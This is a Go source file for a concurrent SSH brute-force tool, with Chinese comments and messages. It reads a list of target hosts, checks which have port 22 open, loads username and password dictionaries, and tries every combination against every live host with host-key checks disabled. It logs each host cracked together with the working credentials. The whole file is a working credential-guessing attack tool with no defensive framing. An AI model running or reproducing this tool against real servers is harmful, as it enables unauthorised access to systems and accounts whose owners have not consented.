package main

import (
	"fmt"
	"log"
	"net"
	"time"
	"os"
	"bufio"
	"strings"
	"sync"
	"golang.org/x/crypto/ssh"
)

type Task struct {
	ip string
	user string
	password string
}

func checkAlive(ip string) bool {
	alive := false
	_, err := net.DialTimeout("tcp", fmt.Sprintf("%v:%v", ip, "22"), 30*time.Second)
	if err == nil {
		alive = true
	}
	return alive
}
func readDictFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var result []string
	for scanner.Scan() {
		passwd := strings.TrimSpace(scanner.Text())
		if passwd != "" {
			result = append(result, passwd)
		}
	}
	return result, err
}

func sshLogin(ip, username, password string) (bool, error) {
	success := false
	config := &ssh.ClientConfig{
		User:username,
		Auth:[]ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout: 3*time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", ip, 22), config)
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		errRet := session.Run("echo 正寒之心")
		if err == nil && errRet == nil {
			defer session.Close()
			success = true
		}
	}
	return success, err
}

func main() {
	go spinner(100 * time.Millisecond)
	//待破解的主机列表
	ips, err := readConfigFile("config.txt") //[]string{"10.0.0.1", "10.0.0.4", "10.0.0.8"}
	if err != nil {
		log.Fatalln("读取配置文件错误：", err)
	}
	//主机是否存活检查
	var aliveIps []string
	for _, ip := range ips {
		if checkAlive(ip) {
			aliveIps = append(aliveIps, ip)
		}
	}
	//读取弱口令字典
	users, err := readDictFile("user.dic")
	if err != nil {
		log.Fatalln("读取用户名字典文件错误：", err)
	}
	passwords, err := readDictFile("pass.dic")
	if err != nil {
		log.Fatalln("读取密码字典文件错误：", err)
	}
	//爆破
	var tasks []Task
	for _, user := range users {
		for _, password := range passwords {
			for _, ip := range aliveIps {
				tasks = append(tasks, Task{ip, user, password})
			}
		}
	}
	runTask(tasks)
	stopSpinning = true
}

func runTask(tasks []Task) {
	var wg sync.WaitGroup
	for  _, task := range tasks {
		wg.Add(1)
		go func(task Task) {
			defer wg.Done()
			success, _ := sshLogin(task.ip, task.user, task.password)
			if success {
				log.Printf("破解%v成功，用户名是%v,密码是%v\n", task.ip, task.user, task.password)
			}
		}(task)
	}
		wg.Wait()
}
	

func readConfigFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var result []string
	for scanner.Scan() {
		passwd := strings.TrimSpace(scanner.Text())
		if passwd != "" {
			result = append(result, passwd)
		}
	}
	return result, err
}	

	
var stopSpinning bool

func spinner(delay time.Duration) {
	for {
		if stopSpinning {
			break
		}
		for _, r := range `-\l/` {
			fmt.Printf("\r%c>开始破解...", r)
			time.Sleep(delay)
		}
	}
}
	
	
	
	
	
	
	
